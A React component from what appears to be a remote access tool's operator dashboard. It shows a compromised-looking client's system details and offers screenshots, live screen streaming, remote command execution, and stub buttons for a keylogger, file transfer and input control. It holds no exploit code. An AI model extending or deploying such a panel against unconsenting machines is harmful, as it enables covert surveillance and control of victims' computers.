import React, { useState, useEffect } from "react";
import { useClients } from "@/context/clients-context";
import { Client } from "@/types";
import { formatDate, formatRelativeTime } from "@/lib/utils";
import { Button } from "@/components/ui/button";
import CommandTerminal from "@/components/command-terminal";
import { useToast } from "@/hooks/use-toast";

interface ClientDetailsProps {
  client: Client;
  onBack?: () => void;
}

const ClientDetails: React.FC<ClientDetailsProps> = ({ client, onBack }) => {
  const { requestScreenshot, controlStream, executeCommand } = useClients();
  const { toast } = useToast();
  const [screenshot, setScreenshot] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isStreaming, setIsStreaming] = useState(false);

  // Listen for screenshot/stream updates
  useEffect(() => {
    const handleScreenshotMessage = (event: MessageEvent) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === "screenshot" && data.clientId === client.clientId) {
          setScreenshot(data.image);
          setIsLoading(false);
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    };

    const ws = new WebSocket(`${window.location.protocol === "https:" ? "wss:" : "ws:"}//${window.location.host}/ws?apiKey=${localStorage.getItem("apiKey") || ""}`);
    ws.addEventListener("message", handleScreenshotMessage);

    return () => {
      ws.removeEventListener("message", handleScreenshotMessage);
      if (ws.readyState === WebSocket.OPEN) {
        ws.close();
      }
    };
  }, [client.clientId]);

  const handleScreenCapture = async () => {
    setIsLoading(true);
    const success = await requestScreenshot(client.clientId, 50);
    if (!success) {
      setIsLoading(false);
      toast({
        title: "Screenshot Failed",
        description: "Failed to request screenshot from client",
        variant: "destructive",
      });
    }
  };

  const handleStartStream = async () => {
    const success = await controlStream(client.clientId, "start", { quality: 30, fps: 5 });
    if (success) {
      setIsStreaming(true);
    } else {
      toast({
        title: "Stream Failed",
        description: "Failed to start stream from client",
        variant: "destructive",
      });
    }
  };

  const handleStopStream = async () => {
    const success = await controlStream(client.clientId, "stop");
    if (success) {
      setIsStreaming(false);
    } else {
      toast({
        title: "Stream Stop Failed",
        description: "Failed to stop client stream",
        variant: "destructive",
      });
    }
  };

  const handleTerminate = async () => {
    toast({
      title: "Connection Terminated",
      description: `Connection with ${client.hostname} (${client.clientId}) terminated`,
    });
  };

  return (
    <div>
      <div className="flex mb-6 items-center">
        {onBack && (
          <button
            className="mr-4 text-gray-400 hover:text-white"
            onClick={onBack}
          >
            <i className="fas fa-arrow-left"></i>
          </button>
        )}
        <h1 className="text-xl font-semibold text-white">
          Client: <span className="font-mono">{client.clientId}</span>
        </h1>
      </div>

      {/* Client Info and Actions */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-6">
        {/* System Information */}
        <div className="lg:col-span-2 bg-dark-lighter rounded-lg shadow-md">
          <div className="px-6 py-4 border-b border-dark-lightest flex justify-between items-center">
            <h2 className="text-lg font-medium text-white">System Information</h2>
            <Button
              variant="outline"
              size="sm"
              className="text-xs bg-dark px-3 py-1 rounded-md hover:bg-dark-lightest flex items-center"
              onClick={() => toast({
                title: "Refreshing",
                description: "Refreshing system information..."
              })}
            >
              <i className="fas fa-sync-alt mr-1"></i> Refresh
            </Button>
          </div>
          <div className="p-6">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <p className="text-sm text-gray-400 mb-1">Hostname</p>
                <p className="text-sm text-white">{client.hostname}</p>
              </div>
              <div>
                <p className="text-sm text-gray-400 mb-1">IP Address</p>
                <p className="text-sm text-white">{client.ip}</p>
              </div>
              <div>
                <p className="text-sm text-gray-400 mb-1">Operating System</p>
                <p className="text-sm text-white">
                  {client.platform} {client.platformRelease} {client.platformVersion ? `(Build ${client.platformVersion})` : ""}
                </p>
              </div>
              <div>
                <p className="text-sm text-gray-400 mb-1">Architecture</p>
                <p className="text-sm text-white">{client.architecture || "Unknown"}</p>
              </div>
              <div>
                <p className="text-sm text-gray-400 mb-1">Username</p>
                <p className="text-sm text-white">{client.username || "Unknown"}</p>
              </div>
              <div>
                <p className="text-sm text-gray-400 mb-1">Screen Resolution</p>
                <p className="text-sm text-white">{client.screenResolution || "Unknown"}</p>
              </div>
              <div>
                <p className="text-sm text-gray-400 mb-1">First Seen</p>
                <p className="text-sm text-white">{formatDate(client.firstSeen)}</p>
              </div>
              <div>
                <p className="text-sm text-gray-400 mb-1">Last Seen</p>
                <p className="text-sm text-white">{formatRelativeTime(client.lastSeen)}</p>
              </div>
            </div>
          </div>
        </div>

        {/* Quick Actions */}
        <div className="bg-dark-lighter rounded-lg shadow-md">
          <div className="px-6 py-4 border-b border-dark-lightest">
            <h2 className="text-lg font-medium text-white">Quick Actions</h2>
          </div>
          <div className="p-6">
            <div className="space-y-3">
              <Button
                variant="outline"
                className="w-full bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center"
                onClick={handleScreenCapture}
                disabled={isLoading}
              >
                <i className="fas fa-desktop w-5 h-5 mr-2"></i>
                Screen Capture
              </Button>
              
              {!isStreaming ? (
                <Button
                  variant="outline"
                  className="w-full bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center"
                  onClick={handleStartStream}
                >
                  <i className="fas fa-video w-5 h-5 mr-2"></i>
                  Start Stream
                </Button>
              ) : (
                <Button
                  variant="outline"
                  className="w-full bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center"
                  onClick={handleStopStream}
                >
                  <i className="fas fa-stop-circle w-5 h-5 mr-2"></i>
                  Stop Stream
                </Button>
              )}
              
              <Button
                variant="outline"
                className="w-full bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center"
                onClick={() => {
                  executeCommand(client.clientId, "whoami");
                  toast({
                    title: "Command Sent",
                    description: "Command sent to client: whoami"
                  });
                }}
              >
                <i className="fas fa-terminal w-5 h-5 mr-2"></i>
                Execute Command
              </Button>
              
              <Button
                variant="outline"
                className="w-full bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center"
                onClick={() => {
                  toast({
                    title: "Keylogger",
                    description: "Keylogger feature not implemented yet"
                  });
                }}
              >
                <i className="fas fa-keyboard w-5 h-5 mr-2"></i>
                Keylogger
              </Button>
              
              <Button
                variant="outline"
                className="w-full bg-dark hover:bg-dark-lightest text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center"
                onClick={() => {
                  toast({
                    title: "File Transfer",
                    description: "File transfer feature not implemented yet"
                  });
                }}
              >
                <i className="fas fa-file-download w-5 h-5 mr-2"></i>
                File Transfer
              </Button>
              
              <Button
                variant="destructive"
                className="w-full hover:bg-red-700 text-white font-medium py-2 px-4 rounded-md transition duration-200 flex items-center"
                onClick={handleTerminate}
              >
                <i className="fas fa-power-off w-5 h-5 mr-2"></i>
                Terminate Connection
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Command Terminal */}
      <div className="bg-dark-lighter rounded-lg shadow-md mb-6">
        <div className="px-6 py-4 border-b border-dark-lightest">
          <h2 className="text-lg font-medium text-white">Command Terminal</h2>
        </div>
        <div className="p-6">
          <CommandTerminal clientId={client.clientId} />
        </div>
      </div>

      {/* Screenshot / Stream Viewer */}
      <div className="bg-dark-lighter rounded-lg shadow-md">
        <div className="px-6 py-4 border-b border-dark-lightest flex justify-between items-center">
          <h2 className="text-lg font-medium text-white">Screen Capture</h2>
          <div className="flex space-x-2">
            <Button
              variant="outline"
              size="sm"
              className="text-xs bg-dark px-3 py-1 rounded-md hover:bg-dark-lightest flex items-center"
              onClick={handleScreenCapture}
              disabled={isLoading}
            >
              <i className="fas fa-camera mr-1"></i> Capture
            </Button>
            {!isStreaming ? (
              <Button
                variant="default"
                size="sm"
                className="text-xs bg-primary px-3 py-1 rounded-md hover:bg-blue-700 flex items-center"
                onClick={handleStartStream}
              >
                <i className="fas fa-video mr-1"></i> Stream
              </Button>
            ) : (
              <Button
                variant="destructive"
                size="sm"
                className="text-xs px-3 py-1 rounded-md flex items-center"
                onClick={handleStopStream}
              >
                <i className="fas fa-stop mr-1"></i> Stop
              </Button>
            )}
          </div>
        </div>
        <div className="p-6">
          <div className="relative rounded-md overflow-hidden bg-dark flex items-center justify-center h-96">
            {screenshot ? (
              <img
                src={`data:image/jpeg;base64,${screenshot}`}
                alt={`Screenshot of ${client.hostname}`}
                className="max-w-full h-auto"
              />
            ) : isLoading ? (
              <div className="text-gray-500 flex flex-col items-center">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mb-2"></div>
                <p>Requesting screenshot...</p>
              </div>
            ) : (
              <div className="text-gray-500 flex flex-col items-center">
                <i className="fas fa-desktop text-4xl mb-2"></i>
                <p>No screenshot available</p>
                <p className="text-xs mt-1">Click Capture to take a screenshot</p>
              </div>
            )}
            <div className="absolute bottom-4 right-4 flex space-x-2">
              <Button
                variant="outline"
                size="sm"
                className="bg-dark bg-opacity-70 hover:bg-opacity-100 text-white p-2 rounded-full transition duration-200"
                onClick={() => {
                  toast({
                    title: "Mouse Control",
                    description: "Mouse control not implemented yet"
                  });
                }}
              >
                <i className="fas fa-mouse-pointer"></i>
              </Button>
              <Button
                variant="outline"
                size="sm"
                className="bg-dark bg-opacity-70 hover:bg-opacity-100 text-white p-2 rounded-full transition duration-200"
                onClick={() => {
                  toast({
                    title: "Keyboard Control",
                    description: "Keyboard control not implemented yet"
                  });
                }}
              >
                <i className="fas fa-keyboard"></i>
              </Button>
              <Button
                variant="outline"
                size="sm"
                className="bg-dark bg-opacity-70 hover:bg-opacity-100 text-white p-2 rounded-full transition duration-200"
                onClick={() => {
                  if (screenshot) {
                    const link = document.createElement('a');
                    link.href = `data:image/jpeg;base64,${screenshot}`;
                    link.download = `screenshot-${client.clientId}-${new Date().toISOString()}.jpg`;
                    link.click();
                  }
                }}
                disabled={!screenshot}
              >
                <i className="fas fa-download"></i>
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ClientDetails;
